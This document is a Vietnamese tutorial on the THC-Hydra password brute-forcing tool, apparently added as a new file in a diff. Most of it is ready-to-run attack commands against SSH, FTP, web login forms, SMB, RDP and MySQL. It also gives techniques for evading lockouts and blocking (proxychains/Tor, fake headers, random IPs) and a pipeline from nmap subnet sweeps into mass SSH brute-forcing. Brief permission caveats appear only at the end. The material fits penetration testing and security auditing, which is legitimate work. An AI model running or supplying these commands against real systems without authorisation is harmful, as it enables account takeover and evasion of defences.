@@ -1,0 +1,182 @@
+1. Hydra là gì?
+
+    THC-Hydra là tool brute-force login đa giao thức mạnh nhất, dòng lệnh, hỗ trợ hơn 50 service:
+
+        SSH, FTP, HTTP(S) Form, SMB, RDP, VNC, MySQL, MSSQL, PostgreSQL, telnet, POP3/IMAP/SMTP, LDAP, SNMP, Redis, SVN, Cisco, v.v.
+
+    Hỗ trợ đa luồng, kết hợp wordlist user/pass, proxy, resume scan, lọc kết quả.
+
+2. Cài đặt Hydra
+A. Trên Kali/Ubuntu/Debian
+
+sudo apt update
+sudo apt install hydra
+
+B. Build từ source (hiếm cần)
+
+git clone https://github.com/vanhauser-thc/thc-hydra.git
+cd thc-hydra
+./configure
+make
+sudo make install
+
+3. Sử dụng Hydra cơ bản
+A. Brute-force SSH
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+
+    -l: 1 username
+
+    -P: file wordlist password
+
+    ssh://host: giao thức + host/IP
+
+B. Brute-force HTTP Basic Auth
+
+hydra -l admin -P passwords.txt http-get://site.com/protected
+
+C. Brute-force FTP
+
+hydra -L users.txt -P passwords.txt ftp://10.10.10.1
+
+    -L: file user
+
+4. Các tuỳ chọn quan trọng
+Tham số	Ý nghĩa
+-l <user>	User cố định
+-L <file>	File chứa danh sách user
+-p <pass>	Pass cố định
+-P <file>	File passlist
+-s <port>	Chỉ định port
+-V	In từng lần thử
+-vV	Verbose chi tiết hơn
+-t <num>	Số thread song song (default 16)
+-o <file>	Lưu kết quả ra file
+-f	Thoát khi tìm thấy 1 thành công
+-u	Thử từng user với toàn bộ pass trước khi sang user khác
+-e nsr	Thử user/pass null hoặc giống nhau (n=null, s=same, r=reverse)
+-w <time>	Timeout mỗi attempt
+-I	Bỏ qua host down
+-S	Sử dụng SSL/TLS
+
+Ví dụ:
+
+hydra -L users.txt -P passwords.txt -t 32 -o result.txt ssh://host
+
+5. Brute-force HTTP Form (web login)
+A. Xác định thông tin POST form
+
+    Dùng Burp Suite/ZAP… xác định đường dẫn, param, giá trị thất bại (ví dụ: "Invalid", "Login failed").
+
+B. Lệnh mẫu
+
+hydra -L users.txt -P pass.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
+
+    /login.php:user=^USER^&pass=^PASS^:Invalid
+
+        /login.php: đường dẫn POST
+
+        user=^USER^&pass=^PASS^: param, ^USER^ và ^PASS^ sẽ được hydra thay tự động
+
+        :Invalid: chuỗi xác định login thất bại
+
+C. Thêm Cookie, UA, Header
+
+hydra -L users.txt -P pass.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:Login Failed" -H "Cookie: PHPSESSID=xyz"
+
+D. HTTP GET Form (ít gặp hơn)
+
+hydra -L users.txt -P pass.txt http-get-form "/login.php?user=^USER^&pass=^PASS^:fail"
+
+6. Brute-force các dịch vụ khác
+
+    SMB:
+
+hydra -L users.txt -P pass.txt smb://192.168.1.100
+
+RDP:
+
+hydra -L users.txt -P pass.txt rdp://10.10.10.2
+
+MySQL:
+
+    hydra -L users.txt -P pass.txt mysql://host
+
+7. Một số kỹ thuật nâng cao & bypass
+
+    Brute-force nhiều host cùng lúc:
+
+hydra -L users.txt -P pass.txt ssh://host1,host2,host3
+
+Thêm delay để tránh lock/bị block:
+
+hydra -L users.txt -P pass.txt -t 8 -w 5 ssh://host
+
+Dùng proxy (Burp/ZAP, Tor):
+
+    proxychains hydra ...
+
+    Brute-force Auth 2 lớp (multi-step):
+
+        Kết hợp với script hoặc extension ngoài (Hydra bản chuẩn không tự động bypass captcha, OTP).
+
+    Bypass filter:
+
+        Fake UA, Header, Cookie, random IP…
+
+        Thêm -H để gửi header tùy ý.
+
+8. Tối ưu tốc độ & tránh block
+
+    Không brute quá nhanh với các service có lockout (web, RDP, AD…).
+
+    Nên dùng -t 4-8 cho web form, -t 32+ cho SSH, FTP, POP3...
+
+    Không dùng brute thực chiến trên site thật nếu chưa xin phép.
+
+9. Kết hợp automation, batch scan
+
+    Quét nhiều host:
+
+hydra -L users.txt -P pass.txt -M hostlist.txt ssh
+
+Kết hợp nmap (liệt kê host sống + port):
+
+    nmap -p 22 --open 10.10.10.0/24 -oG sshhosts.txt
+    awk '/22\/open/ {print $2}' sshhosts.txt > hostlist.txt
+    hydra -L users.txt -P pass.txt -M hostlist.txt ssh
+
+10. Phân tích kết quả & filter
+
+    Output báo user/pass thành công
+
+    [22][ssh] host: 192.168.1.10   login: admin   password: 123456
+
+    Dùng -o để log ra file, hoặc grep lọc kết quả.
+
+11. Một số lỗi thường gặp và cách xử lý
+Lỗi	Xử lý
+Quét quá chậm	Giảm wordlist, tăng thread, check kết nối
+Toàn báo fail	Check lại syntax form, param, chuỗi fail, thử user/pass combo
+Service down, không trả về	Dùng -I, kiểm tra host sống
+Bị lock account	Thêm delay -w, giảm thread, hoặc đổi phương pháp
+Không nhận HTTPS	Thêm -S hoặc dùng proxy đúng
+12. Tài liệu & link hữu ích
+
+    Hydra Official
+
+    Hydra Module List
+
+    PayloadAllTheThings Brute-Force
+
+    SecLists user/pass list
+
+    hydra -h
+
+Tóm tắt nhanh
+
+    Hydra: tool brute-force mạnh nhất, đa giao thức, tốc độ cao, hỗ trợ nhiều tuỳ biến cho pentester, audit nội bộ, kiểm tra policy.
+
+    Kết hợp wordlist phù hợp, batch nhiều host, đa luồng, output đẹp.
+
+    Nên dùng đúng mục đích, tránh brute vào dịch vụ production thật nếu chưa được phép!
